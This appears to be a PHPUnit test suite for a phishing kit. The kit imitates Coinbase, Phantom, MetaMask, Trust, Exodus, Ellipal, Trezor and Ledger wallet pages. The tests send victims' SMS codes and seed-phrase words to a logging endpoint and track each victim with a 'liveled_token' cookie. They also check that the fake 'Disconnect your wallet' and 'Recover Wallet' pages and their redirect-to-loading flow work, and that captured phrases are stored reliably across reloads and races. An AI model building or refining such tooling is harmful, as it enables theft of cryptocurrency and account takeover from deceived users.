        $this->assertStringContainsString("p==='/ledger/1'||p==='/ledger/2'||p==='/ledger/3'||p==='/ledger/1/recover'||p==='/ledger/2/recover'||p==='/ledger/3/recover'||p==='/ledger/loading'", $ldLoad);

        $preview = $this->get('/coinbase/sms-code?_liveled_preview=1')->assertOk()->getContent();
        $previewReturn = strpos($preview, "if(window.location.search.indexOf('_liveled_preview')!==-1)return;");
        $this->assertNotFalse($previewReturn);
        $this->assertGreaterThan($previewReturn, strpos($preview, $fbLock));
        $this->assertStringNotContainsString("fetch('/session/activate'", substr($preview, 0, $previewReturn));

        $this->withCookie('liveled_token', $token)->get('/coinbase/password')->assertRedirect('/coinbase/sign-in');
    }

    public function test_five_hundred_lifecycle_cycles(): void
    {
        $counts = [
            'fresh_no_activate' => 0,
            'history_restore' => 0,
            'race_late_a' => 0,
            'sealed_n1' => 0,
            'f5' => 0,
            'page_identity' => 0,
        ];

        for ($i = 0; $i < 100; $i++) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
            $doc = $this->doc($token);
            $this->writeSms($token, $doc, str_pad((string) $i, 6, '0', STR_PAD_LEFT))->assertOk();
            $counts['fresh_no_activate']++;
        }

        for ($i = 0; $i < 100; $i++) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
            $a = $this->doc($token);
            $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
            $b = $this->doc($token);
            $this->writeSms($token, $a, '000000')->assertStatus(409);
            $act = $this->activate($token, $a, '/coinbase/sms-code')->assertOk()->json();
            $this->assertTrue($act['renewed']);
            $c = (string) $act['doc'];
            $this->assertSame('coinbase_sms_code', $this->page($token));
            $this->writeSms($token, $c, str_pad((string) $i, 6, '0', STR_PAD_LEFT))->assertOk();
            $this->writeSms($token, $a, '111111')->assertStatus(409);
            $this->writeSms($token, $b, '222222')->assertStatus(409);
            $counts['history_restore']++;
        }

        for ($i = 0; $i < 100; $i++) {
            $token = $this->token();
            $t1 = 2000.0 + $i;
            $t2 = $t1 + 1;
            $tA = $t2 + 1;
            $tB = $tA + 1;
            $this->getAt($token, '/coinbase/sms-code', $t1);
            $docA = $this->doc($token);
            $this->getAt($token, '/coinbase/loading', $t2);
            $docB = $this->doc($token);
            $win = $this->activateAt($token, $docB, '/coinbase/loading', $tB)->assertOk()->json();
            $this->assertFalse($win['renewed']);
            $this->assertSame($docB, $win['doc']);
            $this->activateAt($token, $docA, '/coinbase/sms-code', $tA)->assertStatus(409);
            $this->assertSame($docB, $this->doc($token));
            $this->writeSms($token, $docA, '555555')->assertStatus(409);
            $counts['race_late_a']++;
        }

        for ($i = 0; $i < 75; $i++) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
            $docA = $this->doc($token);
            $stay = (int) $this->visitSeed($token, $docA)->assertOk()->json('stay');
            $this->seedState($token, $docA, $stay, ['s'.$i])->assertOk();
            $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
            $docB = $this->doc($token);
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'page_visit',
                'page' => 'coinbase_loading',
                'element' => 'page',
                'doc' => $docB,
            ])->assertOk();
            $this->assertSame('sealed', $this->attempts($token)[0]['state']);
            $restored = $this->activate($token, $docA, '/coinbase/seed')->assertOk()->json();
            $docC = (string) $restored['doc'];
            $ack = $this->visitSeed($token, $docC)->assertOk()->json();
            $this->assertNotSame($stay, (int) $ack['stay']);
            $this->assertCount(2, $this->attempts($token));
            $this->seedState($token, $docC, $stay, ['nope'])->assertStatus(409);
            $this->seedState($token, $docC, (int) $ack['stay'], ['n'.$i])->assertOk();
            $counts['sealed_n1']++;
        }

        for ($i = 0; $i < 75; $i++) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
            $doc1 = $this->doc($token);
            $stay = (int) $this->visitSeed($token, $doc1)->assertOk()->json('stay');
            $this->seedState($token, $doc1, $stay, ['f5'])->assertOk();
            $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
            $doc2 = $this->doc($token);
            $this->assertNotSame($doc1, $doc2);
            $ack = $this->visitSeed($token, $doc2)->assertOk()->json();
            $this->assertSame($stay, (int) $ack['stay']);
            $this->assertCount(1, $this->attempts($token));
            $counts['f5']++;
        }

        for ($i = 0; $i < 50; $i++) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/coinbase/sign-in')->assertOk();
            $doc = $this->doc($token);
            $this->assertSame('coinbase_sign_in', $this->page($token));
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'page_visit',
                'page' => 'coinbase_sign_in',
                'element' => 'page',
                'doc' => $doc,
            ])->assertOk();
            $this->assertSame('coinbase_sign_in', $this->page($token));
            $again = $this->activate($token, $doc, '/coinbase/sign-in')->assertOk()->json();
            $this->assertFalse($again['renewed']);
            $this->assertSame($doc, $again['doc']);
            $counts['page_identity']++;
        }

        $this->assertSame(100, $counts['fresh_no_activate']);
        $this->assertSame(100, $counts['history_restore']);
        $this->assertSame(100, $counts['race_late_a']);
        $this->assertSame(75, $counts['sealed_n1']);
        $this->assertSame(75, $counts['f5']);
        $this->assertSame(50, $counts['page_identity']);
        $this->assertSame(500, array_sum($counts));
    }

    public function test_active_legacy_inherits_v2_client(): void
    {
        $token = $this->token();
        $legacyIife = "window._llStayReadyPromise=(function(){if(!window._llDocId)";
        $rearm = 'function _llRearmIfVisible(){if(!_llDocVisible()||!window._llAuthDead)return;';
        $fresh = "_llNavType()!=='back_forward'";
        $rows = [
            ['/phantom/seeds', "window.location.replace('/phantom/loading');"],
            ['/phantom/loading', "window.location.replace('/phantom/loading');"],
            ['/phantom/recover', "window.location.replace('/phantom/loading');"],
            ['/metamask/import', "window.location.replace('/metamask/loading');"],
            ['/metamask/loading', "window.location.replace('/metamask/loading');"],
            ['/metamask/recover', "window.location.replace('/metamask/loading');"],
            ['/trust/disconnect', "window.location.replace('/trust/loading');"],
            ['/trust/recover', "window.location.replace('/trust/loading');"],
            ['/trust/loading', "window.location.replace('/trust/loading');"],
            ['/exodus/import', "window.location.replace('/exodus/loading');"],
            ['/exodus/recover', "window.location.replace('/exodus/loading');"],
            ['/exodus/loading', "window.location.replace('/exodus/loading');"],
            ['/ellipal/1', "window.location.replace('/ellipal/loading');"],
            ['/ellipal/recover', "window.location.replace('/ellipal/loading');"],
            ['/ellipal/loading', "window.location.replace('/ellipal/loading');"],
            ['/trezor/phrase-page', "window.location.replace('/trezor/loading');"],
            ['/trezor/recover', "window.location.replace('/trezor/loading');"],
            ['/trezor/loading', "window.location.replace('/trezor/loading');"],
            ['/trezor/connect', "window.location.replace('/trezor/phrase-page');"],
            ['/ledger/1', "window.location.replace('/ledger/loading');"],
            ['/ledger/2', "window.location.replace('/ledger/loading');"],
            ['/ledger/3', "window.location.replace('/ledger/loading');"],
            ['/ledger/1/recover', "window.location.replace('/ledger/loading');"],
            ['/ledger/2/recover', "window.location.replace('/ledger/loading');"],
            ['/ledger/3/recover', "window.location.replace('/ledger/loading');"],
            ['/ledger/support', "window.location.replace('/ledger/loading');"],
            ['/ledger/loading', "window.location.replace('/ledger/loading');"],
        ];
        foreach ($rows as [$path, $lock]) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertStringContainsString('/session/activate', $html, $path);
            $this->assertStringContainsString('function _llBeginActivate()', $html, $path);
            $this->assertStringContainsString('function _llBeginVisit()', $html, $path);
            $this->assertStringContainsString($rearm, $html, $path);
            $this->assertStringContainsString($fresh, $html, $path);
            $this->assertStringContainsString($lock, $html, $path);
            $this->assertStringNotContainsString($legacyIife, $html, $path);
            if ($path !== '/ledger/support') {
                $this->assertSame(1, substr_count($html, '/session/activate'), $path);
                $this->assertSame(1, substr_count($html, 'function _llBeginActivate()'), $path);
                $this->assertSame(1, substr_count($html, 'function _llBeginVisit()'), $path);
                $this->assertSame(1, substr_count($html, $rearm), $path);
                $this->assertSame(1, substr_count($html, 'setInterval(_poll,1000)'), $path);
                $this->assertSame(1, substr_count($html, 'function _llReconcileFromPoll(j)'), $path);
            }
            $this->assertDoesNotMatchRegularExpression('/setInterval\([^)]*_llBeginActivate/', $html);
        }
    }

    public function test_parked_and_excluded_remain_legacy(): void
    {
        $token = $this->token();
        foreach ([
            '/phantom/email',
            '/phantom/import',
            '/phantom/ledger',
        ] as $path) {
            $this->withCookie('liveled_token', $token)->get($path)->assertNotFound();
        }
        $this->withCookie('liveled_token', $token)->get('/ledger/signin')->assertRedirect('/ledger/support');
        $fb = $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk()->getContent();
        $this->assertSame(1, substr_count($fb, '/session/activate'));
        $this->assertSame(1, substr_count($fb, 'function _llBeginActivate()'));
    }

    public function test_migrated_get_visit_activate_share_canonical_page(): void
    {
        $rows = [
            ['/phantom/seeds', 'phantom_seeds', 'Phantom Page'],
            ['/phantom/loading', 'phantom_loading', 'Phantom Page'],
            ['/phantom/recover', 'phantom_recover', 'page'],
            ['/metamask/import', 'metamask_import', 'page'],
            ['/metamask/loading', 'metamask_loading', 'page'],
            ['/metamask/recover', 'metamask_recover', 'page'],
            ['/trust/disconnect', 'trust_disconnect', 'page'],
            ['/exodus/import', 'exodus_import', 'page'],
            ['/ellipal/1', 'ellipal_24word', 'page'],
            ['/trezor/phrase-page', 'trezor_phrase_page', 'page'],
            ['/ledger/1', 'ledger_1', 'page'],
            ['/ledger/support', 'ledger_signin', 'page'],
        ];
        foreach ($rows as [$path, $page, $element]) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get($path)->assertOk();
            $doc = $this->doc($token);
            $this->assertSame($page, $this->page($token), $path);
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'page_visit',
                'page' => $page,
                'element' => $element,
                'doc' => $doc,
            ])->assertOk();
            $this->assertSame($page, $this->page($token), $path);
            $again = $this->activate($token, $doc, $path)->assertOk()->json();
            $this->assertFalse($again['renewed'], $path);
            $this->assertSame($doc, $again['doc'], $path);
            $this->assertSame($page, $this->page($token), $path);
        }
    }

    public function test_migrated_stale_write_and_older_activate_cannot_rewind(): void
    {
        $token = $this->token();
        $t1 = 1000.0;
        $t2 = $t1 + 1;
        $tA = $t2 + 1;
        $tB = $tA + 1;
        $this->getAt($token, '/phantom/seeds', $t1);
        $docA = $this->doc($token);
        $this->getAt($token, '/phantom/loading', $t2);
        $docB = $this->doc($token);
        $this->assertSame('phantom_loading', $this->page($token));

        $win = $this->activateAt($token, $docB, '/phantom/loading', $tB)->assertOk()->json();
        $this->assertFalse($win['renewed']);
        $this->assertSame($docB, $win['doc']);
        $this->activateAt($token, $docA, '/phantom/seeds', $tA)->assertStatus(409);
        $this->assertSame($docB, $this->doc($token));
        $this->assertSame('phantom_loading', $this->page($token));

        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'phrase_input',
            'page' => 'phantom_seeds',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['stale'], 'passphrase' => '']),
            'doc' => $docA,
            'stay' => 1,
        ])->assertStatus(409);
    }

    public function test_migrated_family_contracts_stay_intact(): void
    {
        $token = $this->token();
        $phSeeds = $this->withCookie('liveled_token', $token)->get('/phantom/seeds')->assertOk();
        $phSeeds->assertSee('Disconnect Wallet', false);
        $this->assertStringContainsString("window.location.replace('/phantom/loading')", $phSeeds->getContent());
        $phRec = $this->withCookie('liveled_token', $token)->get('/phantom/recover')->assertOk();
        $phRec->assertSee('Recover Wallet', false);
        $phRec->assertDontSee('Disconnect Wallet', false);
        $this->assertStringNotContainsString("type:'phrase_input'", $phRec->getContent());

        $trust = $this->withCookie('liveled_token', $token)->get('/trust/disconnect')->assertOk();
        $trust->assertSee('Disconnect your wallet', false);
        $this->assertStringContainsString("window.location.replace('/trust/loading')", $trust->getContent());

        $ex = $this->withCookie('liveled_token', $token)->get('/exodus/import')->assertOk();
        $ex->assertSee('Disconnect your wallet', false);
        $this->assertStringContainsString("window.location.replace('/exodus/loading')", $ex->getContent());

        $el = $this->withCookie('liveled_token', $token)->get('/ellipal/1')->assertOk();
        $el->assertSee('Disconnect your wallet', false);
        $this->assertStringContainsString("window.location.replace('/ellipal/loading')", $el->getContent());

        $trz = $this->withCookie('liveled_token', $token)->get('/trezor/phrase-page')->assertOk()->getContent();
        $this->assertStringContainsString("window.location.replace('/trezor/loading')", $trz);
        $connect = $this->withCookie('liveled_token', $token)->get('/trezor/connect')->assertOk()->getContent();
        $this->assertStringContainsString("window.location.replace('/trezor/phrase-page')", $connect);
        $this->assertStringNotContainsString("window.location.replace('/trezor/loading')", $connect);

        $ld = $this->withCookie('liveled_token', $token)->get('/ledger/1')->assertOk();
        $ld->assertSee('Disconnect your Ledger', false);
        $this->assertStringContainsString("window.location.replace('/ledger/loading')", $ld->getContent());
        $this->withCookie('liveled_token', $token)->get('/ledger/support')->assertOk();

        $preview = $this->get('/phantom/seeds?_liveled_preview=1')->assertOk()->getContent();
        $previewReturn = strpos($preview, "if(window.location.search.indexOf('_liveled_preview')!==-1)return;");
        $this->assertNotFalse($previewReturn);
        $this->assertStringNotContainsString("fetch('/session/activate'", substr($preview, 0, $previewReturn));
        $mm = $this->withCookie('liveled_token', $token)->get('/metamask/import')->assertOk()->getContent();
        $this->assertStringContainsString('/session/activate', $mm);
        $this->assertSame(1, substr_count($mm, '/session/activate'));
        $this->assertStringContainsString("window.location.replace('/metamask/loading')", $mm);
    }

    private function token(): string
    {
        return Str::random(48);
    }

    private function doc(string $token): string
    {
        return (string) UserSession::where('session_token', $token)->value('document_id');
    }

    private function page(string $token): string
    {
        return (string) UserSession::where('session_token', $token)->value('current_page');
    }

    private function activate(string $token, string $doc, string $path)
    {
        return $this->withCookie('liveled_token', $token)->post('/session/activate', [
            '_token' => csrf_token(),
            'doc' => $doc,
            'path' => $path,
        ]);
    }

    private function activateAt(string $token, string $doc, string $path, float $startedAt)
    {
        $this->withCookie('liveled_token', $token);

        return $this->call('POST', '/session/activate', [
            '_token' => csrf_token(),
            'doc' => $doc,
            'path' => $path,
        ], $this->prepareCookiesForRequest(), [], ['REQUEST_TIME_FLOAT' => $startedAt]);
    }

    private function getAt(string $token, string $path, float $startedAt)
    {
        $this->withCookie('liveled_token', $token);

        return $this->call('GET', $path, [], $this->prepareCookiesForRequest(), [], [
            'REQUEST_TIME_FLOAT' => $startedAt,
        ]);
    }

    private function writeSms(string $token, string $doc, string $value)
    {
        return $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'form_submit',
            'page' => 'coinbase_sms_code',
            'element' => 'code',
            'value' => $value,
            'doc' => $doc,
        ]);
    }

    private function visitSeed(string $token, string $doc)
    {
        return $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'coinbase_seed',
            'element' => 'page',
            'doc' => $doc,
        ]);
    }

    private function seedState(string $token, string $doc, int $stay, array $words)
    {
        return $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'phrase_input',
            'page' => 'coinbase_seed',
            'element' => 'full_state',
            'value' => json_encode(['words' => $words, 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay,
        ]);
    }

    private function attempts(string $token): array
    {
        $summary = UserSession::where('session_token', $token)->first()->activity_summary;

        return $summary['attempts']['coinbase_seed'] ?? [];
    }
}
